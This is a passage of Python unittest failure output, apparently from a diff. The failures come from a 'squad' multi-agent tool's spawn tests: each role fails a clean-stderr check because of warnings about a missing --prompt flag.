+First list contains 1 additional elements.
+First extra element 0:
+b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pas'
+-  b's --prompt with its first message)'] : b'warning: ba ba-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='team-lead', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: team-lead team-lead-x spawned [82 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent '
+-  b'sits idle (pass --prompt with its first message)'] : b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='team-lead', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: team-lead team-lead-x spawned [82 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent '
+-  b'sits idle (pass --prompt with its first message)'] : b'warning: team-lead team-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='tech-lead', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: tech-lead tech-lead-x spawned [82 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent '
+-  b'sits idle (pass --prompt with its first message)'] : b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='tech-lead', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: tech-lead tech-lead-x spawned [82 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent '
+-  b'sits idle (pass --prompt with its first message)'] : b'warning: tech-lead tech-lead-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='qa-whitebox', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: qa-whitebox qa-whitebox-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='qa-whitebox', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: qa-whitebox qa-whitebox-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: qa-whitebox qa-whitebox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='qa-blackbox', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: qa-blackbox qa-blackbox-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='qa-blackbox', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: qa-blackbox qa-blackbox-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: qa-blackbox qa-blackbox-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='dev', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: dev dev-x spawned without --pr[70 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (p'
+-  b'ass --prompt with its first message)'] : b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='dev', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: dev dev-x spawned without --pr[70 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (p'
+-  b'ass --prompt with its first message)'] : b'warning: dev dev-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='designer', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: designer designer-x spawned wi[80 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: designer designer-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: designer designer-x spawned without --prompt; an unbriefed agent si'
+-  b'ts idle (pass --prompt with its first message)'] : b'warning: designer designer-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='designer', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: designer designer-x spawned wi[80 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: designer designer-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: designer designer-x spawned without --prompt; an unbriefed agent si'
+-  b'ts idle (pass --prompt with its first message)'] : b'warning: designer designer-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='token-coach', dry=True)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: token-coach token-coach-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+======================================================================
+FAIL: test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path (test_utf8_helpers.LabelAndSpawnTest.test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path) (role='token-coach', dry=False)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 116, in test_spawn_dry_run_and_stubbed_run_for_every_role_with_a_space_and_emoji_path
+    self.assert_clean(r)
+    ~~~~~~~~~~~~~~~~~^^^
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_utf8_helpers.py", line 81, in assert_clean
+    self.assertEqual(extra, [], r.stderr)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
+AssertionError: Lists differ: [b'warning: token-coach token-coach-x spaw[86 chars]ge)'] != []
+
+First list contains 1 additional elements.
+First extra element 0:
+b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)'
+
++ []
+- [b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed ag'
+-  b'ent sits idle (pass --prompt with its first message)'] : b'warning: token-coach token-coach-x spawned without --prompt; an unbriefed agent sits idle (pass --prompt with its first message)\nsquad-process: no `plugin:` pin in the home; composing from the running plugin\nlegacy squad: plugin rules attached, local process.md edits not applied; run squad-process adopt --dry-run\n'
+
+----------------------------------------------------------------------
+Ran 12 tests in 2.568s
+
+FAILED (failures=16)
+
+----------------------------------------------------------------------
+Ran 1481 tests in 59.051s
+
+FAILED (files=6: test_squadinbox, test_squadsettings, test_utf8_helpers, test_process_conversion, test_po_inbox_mod, test_qab_optional)
